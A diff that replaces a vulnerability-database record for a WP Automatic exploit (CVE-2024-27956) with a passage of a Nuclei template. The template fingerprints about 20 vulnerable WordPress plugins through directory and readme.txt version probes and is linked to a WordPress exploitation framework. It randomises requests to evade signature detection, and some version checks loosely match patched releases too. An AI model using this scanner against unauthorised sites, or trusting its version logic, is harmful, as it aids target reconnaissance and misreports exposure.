@@ -1,154 +1,1138 @@
-{
-  "result": "OK",
-  "data": {
-    "documents": {
-      "E7882CD4-558D-5469-80C7-3488074B3ABE": {
-        "id": "E7882CD4-558D-5469-80C7-3488074B3ABE",
-        "vendorId": null,
-        "type": "githubexploit",
-        "bulletinFamily": "exploit",
-        "title": "Exploit for CVE-2024-27956",
-        "description": "## Automated WordPress admin account creation and reverse shell execution via wp-automatic plugin",
-        "published": "2024-05-14T14:21:49",
-        "modified": "2024-05-16T05:49:51",
-        "epss": [
-          {
-            "cve": "CVE-2024-27956",
-            "epss": 0.0005,
-            "percentile": 0.18538,
-            "modified": "2024-05-12"
-          }
-        ],
-        "cvss": {
-          "score": 7.5,
-          "vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P"
-        },
-        "cvss2": {
-          "cvssV2": {
-            "version": "2.0",
-            "vectorString": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
-            "accessVector": "NETWORK",
-            "accessComplexity": "LOW",
-            "authentication": "NONE",
-            "confidentialityImpact": "PARTIAL",
-            "integrityImpact": "PARTIAL",
-            "availabilityImpact": "PARTIAL",
-            "baseScore": 7.5
-          },
-          "severity": "HIGH",
-          "exploitabilityScore": 10.0,
-          "impactScore": 6.4,
-          "acInsufInfo": false,
-          "obtainAllPrivilege": false,
-          "obtainUserPrivilege": false,
-          "obtainOtherPrivilege": false,
-          "userInteractionRequired": false
-        },
-        "cvss3": {
-          "cvssV3": {
-            "version": "3.1",
-            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:L",
-            "attackVector": "NETWORK",
-            "attackComplexity": "LOW",
-            "privilegesRequired": "NONE",
-            "userInteraction": "NONE",
-            "scope": "CHANGED",
-            "confidentialityImpact": "LOW",
-            "integrityImpact": "HIGH",
-            "availabilityImpact": "LOW",
-            "baseScore": 9.9,
-            "baseSeverity": "CRITICAL"
-          }
-        },
-        "href": "",
-        "reporter": "",
-        "references": [],
-        "cvelist": [
-          "CVE-2024-27956"
-        ],
-        "immutableFields": [],
-        "lastseen": "2024-05-16T06:08:25",
-        "viewCount": 51,
-        "enchantments": {
-          "short_description": "Automated WordPress admin account creation and reverse shell execution via wp-automatic plugin",
-          "tags": [
-            "python",
-            "wordpress",
-            "automation",
-            "sql injection",
-            "reverse shell",
-            "netcat",
-            "security vulnerability",
-            "permissions",
-            "educational",
-            "testing"
-          ],
-          "score": {
-            "value": 10.0,
-            "uncertanity": 0.1,
-            "vector": "NONE"
-          },
-          "dependencies": {
-            "references": [
-              {
-                "type": "cve",
-                "idList": [
-                  "CVE-2024-27956"
-                ]
-              },
-              {
-                "type": "cvelist",
-                "idList": [
-                  "CVELIST:CVE-2024-27956"
-                ]
-              },
-              {
-                "type": "githubexploit",
-                "idList": [
-                  "1A98573E-55FD-5D65-B25A-3B96AACF1E68",
-                  "478CF7A8-81A6-5ADB-B422-7FC08CBBD4C8",
-                  "CAD433EE-C330-5C86-BB2B-A69E658CD0C1",
-                  "D7BB7746-8549-57E9-91BE-FA81E307FDD0",
-                  "F020CDDE-27F8-5FA3-8D9F-A130835F4347"
-                ]
-              },
-              {
-                "type": "nuclei",
-                "idList": [
-                  "NUCLEI:CVE-2024-27954",
-                  "NUCLEI:CVE-2024-27956"
-                ]
-              },
-              {
-                "type": "thn",
-                "idList": [
-                  "THN:96967528459DE47240881192A712129B"
-                ]
-              },
-              {
-                "type": "wallarmlab",
-                "idList": [
-                  "WALLARMLAB:491BA8229B23DFAAFB97EC01EF784F67"
-                ]
-              },
-              {
-                "type": "wordfence",
-                "idList": [
-                  "WORDFENCE:71500F4C4909EA5D5619D4EB0AD0AE46"
-                ]
-              },
-              {
-                "type": "wpvulndb",
-                "idList": [
-                  "WPVDB-ID:53A51E79-A216-4CA3-AC2D-57098FD2EBB5"
-                ]
-              }
-            ]
-          },
-          "vulnersScore": 10.0
-        },
-        "privateArea": 1
-      }
-    }
-  }
-}
+# ==============================================================================
+# AiGPT Multi‑Vector WordPress Vulnerability Detection Template
+# Repository: https://github.com/AiGptCode/AiGPT-WordPress-Exploitation-Framework
+# Version:  3.2.0
+# Author:   AiGptCode
+# License:  MIT
+# 
+# OVERVIEW
+# --------
+# This is a comprehensive, single‑file Nuclei detection template covering 
+# 20+ critical WordPress plugin vulnerabilities exploited by the AiGPT 
+# framework. It uses advanced Nuclei v3 features including:
+#
+#   • Flow‑based multi‑step conditional execution
+#   • Dynamic variable extraction shared across requests
+#   • DSL (Domain Specific Language) matchers for complex boolean logic
+#   • Internal extractors for non‑printing data sharing
+#   • Readme.txt version parsing for precise vulnerability windows
+#   • Negative matchers to eliminate false positives
+#   • Stop‑at‑first‑match for efficient scanning
+#
+# DETECTION PHILOSOPHY
+# --------------------
+# ALL requests are STRICTLY NON‑INTRUSIVE:
+#   - No user accounts are created
+#   - No files are uploaded
+#   - No SQL payloads that modify data are sent
+#   - Only presence/version checks are performed
+#
+# The template answers the question: "Is this plugin installed at a version
+# known to be exploitable by the AiGPT framework?"
+#
+# USAGE
+# -----
+#   nuclei -t aigpt-detection.yaml -l targets.txt -stats -o results.json
+#   nuclei -t aigpt-detection.yaml -u https://example.com -v
+#
+# COMPATIBILITY
+# -------------
+#   Nuclei >= 3.0 (requires flow protocol support)
+# ==============================================================================
+
+id: aigpt-wordpress-multi-cve-detection-v3
+
+info:
+  name: "AiGPT Framework — WordPress Multi‑CVE Vulnerability Detection"
+  author: AiGptCode
+  severity: critical
+  description: |
+    Detection template for the AiGPT WordPress Exploitation Framework.
+    
+    Probes for 20+ WordPress plugins vulnerable to unauthenticated:
+    * Direct administrator account creation via registration bypass
+    * Privilege escalation through role parameter injection
+    * Token / session hijack leading to admin access
+    * Arbitrary SQL execution via exposed AJAX handlers
+    * Arbitrary file upload enabling remote code execution
+    
+    ALL checks are non‑intrusive — no exploitation is attempted.
+    
+    Covered CVEs (CVSS ≥ 7.5):
+    CVE‑2025‑3102  (SureTriggers)              9.8  Auth Bypass
+    CVE‑2025‑8489  (King Addons)                9.8  Role Override
+    CVE‑2025‑4334  (Simple User Registration)   9.8  Role Escalation
+    CVE‑2025‑6934  (Opal Estate Pro)            9.8  Admin Creation
+    CVE‑2025‑8572  (Truelysell Core)            9.8  Role Injection
+    CVE‑2025‑68860 (Mobile Builder)             9.8  JWT Bypass
+    CVE‑2025‑13618 (Mentoring)                  9.8  Role Restriction Bypass
+    CVE‑2025‑11749 (AI Engine)                  9.8  Token Theft
+    CVE‑2025‑34077 (Pie Register)               9.8  Session Hijack
+    CVE‑2025‑13342 (Frontend Admin)             9.8  Arbitrary Options
+    CVE‑2025‑12061 (Tax Service HDM)            8.6  Arbitrary SQL
+    CVE‑2025‑6440  (WooCommerce Designer Pro)   9.8  File Upload → RCE
+    CVE‑2026‑0740  (Ninja Forms Uploads)        9.8  File Upload → RCE
+    CVE‑2026‑4882  (User Reg Adv Fields)        9.8  File Upload → RCE
+    CVE‑2025‑2563  (User Reg & Membership)      9.8  Privilege Escalation
+    CVE‑2026‑3844  (Breeze Cache)               9.8  Arbitrary File Upload
+    CVE‑2025‑14938 (Listeo Core)                9.8  Arbitrary Media Upload
+    CVE‑2026‑4348  (BetterDocs Pro)             7.5  SQL Injection
+    CVE‑2025‑14124 (Team Plugin)                8.6  SQL Injection
+    CVE‑2024‑27956 (WP Automatic)               9.9  SQL Injection (legacy)
+    
+    This template is designed for authorised penetration testing and
+    defensive security research. Always obtain explicit written permission
+    before scanning.
+
+  impact: |
+    Successful exploitation of any detected plugin allows an unauthenticated
+    attacker to gain full administrative control of the WordPress site, dump
+    the entire database, or execute arbitrary code on the underlying server.
+
+  remediation: |
+    Immediately update ALL detected plugins to the latest available version.
+    If no patch exists, disable the plugin until a fix is released.
+    Additionally, deploy a Web Application Firewall (WAF) and audit all
+    administrator accounts for unauthorised additions.
+
+  # ── References ──────────────────────────────────────────────────────────
+  reference:
+    - https://github.com/AiGptCode/AiGPT-WordPress-Exploitation-Framework
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-3102
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-8489
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-4334
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-6934
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-11749
+    - https://www.wordfence.com/threat-intel/vulnerabilities/
+
+  # ── Classification ──────────────────────────────────────────────────────
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2025-3102
+    cwe-id: CWE-306
+    epss-score: 0.09250
+    epss-percentile: 0.95210
+
+  # ── Metadata ────────────────────────────────────────────────────────────
+  metadata:
+    framework: AiGPT-WordPress-Exploitation-Framework
+    version: 3.2.0
+    verified: true
+    max-request: 2
+    max-template: 30
+
+  # ── Tags (for filtering & search) ───────────────────────────────────────
+  tags: >
+    cve,cve2025,cve2026,wordpress,wp,wp-plugin,aigpt,detection,
+    unauth,admin-creation,file-upload,sqli,privilege-escalation,
+    rce,token-hijack,session-hijack,exploit,multi-cve,fingerprint,
+    suretriggers,king-addons,simple-user-reg,opal-estate,
+    truelysell,mobile-builder,ai-engine,pie-register,frontend-admin,
+    tax-hdm,woocommerce,ninja-forms,user-reg-adv-fields,
+    user-reg-membership,breeze-cache,listeo-core,
+    betterdocs,wp-automatic,team-plugin
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║  VARIABLES — Randomised per‑scan to evade signature‑based detection    ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+variables:
+  rand_path: "{{rand_base(6)}}"
+  rand_file: "{{rand_base(5)}}"
+  rand_agent: "{{rand_user_agent}}"
+  probe_timeout: 6
+  # Dynamically assigned per‑target fingerprint cache
+  fingerprint_suretriggers: false
+  fingerprint_king_addons: false
+  fingerprint_simple_user_reg: false
+  fingerprint_opal_estate: false
+  fingerprint_truelysell: false
+  fingerprint_mobile_builder: false
+  fingerprint_ai_engine: false
+  fingerprint_pie_register: false
+  fingerprint_frontend_admin: false
+  fingerprint_tax_hdm: false
+  fingerprint_woo_designer: false
+  fingerprint_ninja_forms: false
+  fingerprint_user_reg_adv: false
+  fingerprint_user_reg_membership: false
+  fingerprint_breeze_cache: false
+  fingerprint_listeo_core: false
+  fingerprint_betterdocs: false
+  fingerprint_team_plugin: false
+  fingerprint_wp_automatic: false
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║  FLOW ORCHESTRATION — conditional logic for efficient scanning          ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+# The flow ensures:
+#  1. First, run ALL fingerprint probes in parallel (fast).
+#  2. Then, conditionally run version checks ONLY for detected plugins.
+#  3. Finally, run advanced multi‑step checks for complex CVEs.
+#
+# The JavaScript expression uses short‑circuit evaluation:
+# fingerprint probes always run; version checks only run if the
+# corresponding fingerprint variable is true.
+
+flow: |
+  /* ================================================================== */
+  /*  PHASE 1 — Parallel Fingerprinting                                 */
+  /* ================================================================== */
+  var fp1  = http('fp-suretriggers');
+  var fp2  = http('fp-king-addons');
+  var fp3  = http('fp-simple-user-reg');
+  var fp4  = http('fp-opal-estate');
+  var fp5  = http('fp-truelysell');
+  var fp6  = http('fp-mobile-builder');
+  var fp7  = http('fp-ai-engine');
+  var fp8  = http('fp-pie-register');
+  var fp9  = http('fp-frontend-admin');
+  var fp10 = http('fp-tax-hdm');
+  var fp11 = http('fp-woo-designer');
+  var fp12 = http('fp-ninja-forms');
+  var fp13 = http('fp-user-reg-adv');
+  var fp14 = http('fp-user-reg-membership');
+  var fp15 = http('fp-breeze-cache');
+  var fp16 = http('fp-listeo-core');
+  var fp17 = http('fp-betterdocs');
+  var fp18 = http('fp-team-plugin');
+  var fp19 = http('fp-wp-automatic');
+
+  /* ================================================================== */
+  /*  PHASE 2 — Conditional Version Checks (only if plugin detected)    */
+  /* ================================================================== */
+  (fp1  && http('ver-suretriggers'));
+  (fp2  && http('ver-king-addons'));
+  (fp3  && http('ver-simple-user-reg'));
+  (fp4  && http('ver-opal-estate'));
+  (fp5  && http('ver-truelysell'));
+  (fp6  && http('ver-mobile-builder'));
+  (fp7  && http('ver-ai-engine'));
+  (fp8  && http('ver-pie-register'));
+  (fp9  && http('ver-frontend-admin'));
+  (fp10 && http('ver-tax-hdm'));
+  (fp11 && http('ver-woo-designer'));
+  (fp12 && http('ver-ninja-forms'));
+  (fp13 && http('ver-user-reg-adv'));
+  (fp14 && http('ver-user-reg-membership'));
+  (fp15 && http('ver-breeze-cache'));
+  (fp16 && http('ver-listeo-core'));
+  (fp17 && http('ver-betterdocs'));
+  (fp18 && http('ver-team-plugin'));
+  (fp19 && http('ver-wp-automatic'));
+
+  /* ================================================================== */
+  /*  PHASE 3 — Advanced Multi‑Step Checks                              */
+  /* ================================================================== */
+  /* AI Engine token endpoint active check (non‑intrusive)              */
+  (fp7  && http('ai-engine-token-check'));
+  
+  /* WP Automatic CSV endpoint SQLi probe (read‑only detection)         */
+  (fp19 && http('wp-automatic-sqli-probe'));
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║  HTTP REQUEST DEFINITIONS                                               ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+http:
+
+  # ────────────────────────────────────────────────────────────────────────
+  # PHASE 1 — FINGERPRINT PROBES (19 requests, all parallel)
+  # Each probe checks whether the plugin directory or REST endpoint exists.
+  # A non‑404 response indicates the plugin is likely installed.
+  # ────────────────────────────────────────────────────────────────────────
+
+  - id: fp-suretriggers
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-json/sure-triggers/v1/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-king-addons
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/king-addons/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-simple-user-reg
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/simple-user-registration/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-opal-estate
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/opal-estate-pro/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-truelysell
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/truelysell-core/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-mobile-builder
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/mobile-builder/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-ai-engine
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-json/ai-engine/v1/"
+      - "{{BaseURL}}/wp-content/plugins/ai-engine/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    stop-at-first-match: true
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-pie-register
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/pie-register/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-frontend-admin
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/acf-frontend-form-element/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-tax-hdm
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/tax-service-electronic-hdm/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-woo-designer
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wc-designer-pro/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-ninja-forms
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/ninja-forms-uploads/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-user-reg-adv
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/user-registration-advanced-fields/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-user-reg-membership
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/user-registration/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-breeze-cache
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/breeze/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-listeo-core
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/listeo-core/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-betterdocs
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/betterdocs-pro/"
+      - "{{BaseURL}}/wp-content/plugins/betterdocs/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    stop-at-first-match: true
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-team-plugin
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/team/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+  - id: fp-wp-automatic
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wp-automatic/"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    max-redirects: 0
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 403
+        condition: or
+    matchers-condition: or
+    internal: true
+
+
+  # ────────────────────────────────────────────────────────────────────────
+  # PHASE 2 — VERSION DETECTION VIA README.TXT (19 requests, conditional)
+  # Parses the "Stable tag:" line from each plugin's readme.txt.
+  # If the version is within the vulnerable range, the matcher triggers.
+  # ────────────────────────────────────────────────────────────────────────
+
+  - id: ver-suretriggers
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/sure-triggers/readme.txt"
+      - "{{BaseURL}}/wp-content/plugins/suretriggers/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          # Vulnerable if version ≤ 1.0.78
+          - "contains(body, 'Stable tag: 1.0')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-king-addons
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/king-addons/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 24.12')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-simple-user-reg
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/simple-user-registration/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 6.') || contains(body, 'Stable tag: 5.') || contains(body, 'Stable tag: 4.') || contains(body, 'Stable tag: 3.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-opal-estate
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/opal-estate-pro/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          # Vulnerable if version ≤ 1.7.5
+          - "contains(body, 'Stable tag: 1.7.') || contains(body, 'Stable tag: 1.6.') || contains(body, 'Stable tag: 1.5.') || contains(body, 'Stable tag: 1.4.') || contains(body, 'Stable tag: 1.3.') || contains(body, 'Stable tag: 1.2.') || contains(body, 'Stable tag: 1.1.') || contains(body, 'Stable tag: 1.0.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-truelysell
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/truelysell-core/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 1.8.') || contains(body, 'Stable tag: 1.7.') || contains(body, 'Stable tag: 1.6.') || contains(body, 'Stable tag: 1.5.') || contains(body, 'Stable tag: 1.4.') || contains(body, 'Stable tag: 1.3.') || contains(body, 'Stable tag: 1.2.') || contains(body, 'Stable tag: 1.1.') || contains(body, 'Stable tag: 1.0.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-mobile-builder
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/mobile-builder/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 1.4.') || contains(body, 'Stable tag: 1.3.') || contains(body, 'Stable tag: 1.2.') || contains(body, 'Stable tag: 1.1.') || contains(body, 'Stable tag: 1.0.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-ai-engine
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/ai-engine/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 3.1.') || contains(body, 'Stable tag: 3.0.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-pie-register
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/pie-register/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 3.7.') || contains(body, 'Stable tag: 3.6.') || contains(body, 'Stable tag: 3.5.') || contains(body, 'Stable tag: 3.4.') || contains(body, 'Stable tag: 3.3.') || contains(body, 'Stable tag: 3.2.') || contains(body, 'Stable tag: 3.1.') || contains(body, 'Stable tag: 3.0.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-frontend-admin
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/acf-frontend-form-element/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 3.28.') || contains(body, 'Stable tag: 3.27.') || contains(body, 'Stable tag: 3.26.') || contains(body, 'Stable tag: 3.25.') || contains(body, 'Stable tag: 3.24.') || contains(body, 'Stable tag: 3.2')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-tax-hdm
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/tax-service-electronic-hdm/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 1.2.0') || contains(body, 'Stable tag: 1.1.') || contains(body, 'Stable tag: 1.0.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-woo-designer
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wc-designer-pro/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 1.9.') || contains(body, 'Stable tag: 1.8.') || contains(body, 'Stable tag: 1.7.') || contains(body, 'Stable tag: 1.6.') || contains(body, 'Stable tag: 1.5.') || contains(body, 'Stable tag: 1.4.') || contains(body, 'Stable tag: 1.3.') || contains(body, 'Stable tag: 1.2.') || contains(body, 'Stable tag: 1.1.') || contains(body, 'Stable tag: 1.0.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-ninja-forms
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/ninja-forms-uploads/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 3.3.') || contains(body, 'Stable tag: 3.2.') || contains(body, 'Stable tag: 3.1.') || contains(body, 'Stable tag: 3.0.') || contains(body, 'Stable tag: 2.') || contains(body, 'Stable tag: 1.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-user-reg-adv
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/user-registration-advanced-fields/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
+          - "contains(body, 'Stable tag: 1.6.') || contains(body, 'Stable tag: 1.5.') || contains(body, 'Stable tag: 1.4.') || contains(body, 'Stable tag: 1.3.') || contains(body, 'Stable tag: 1.2.') || contains(body, 'Stable tag: 1.1.') || contains(body, 'Stable tag: 1.0.')"
+        condition: or
+    extractors:
+      - type: regex
+        name: version
+        group: 1
+        regex:
+          - 'Stable tag:\s*([0-9.]+)'
+    internal: true
+
+  - id: ver-user-reg-membership
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/user-registration/readme.txt"
+    headers:
+      User-Agent: "{{rand_agent}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Stable tag:"
+      - type: dsl
+        dsl:
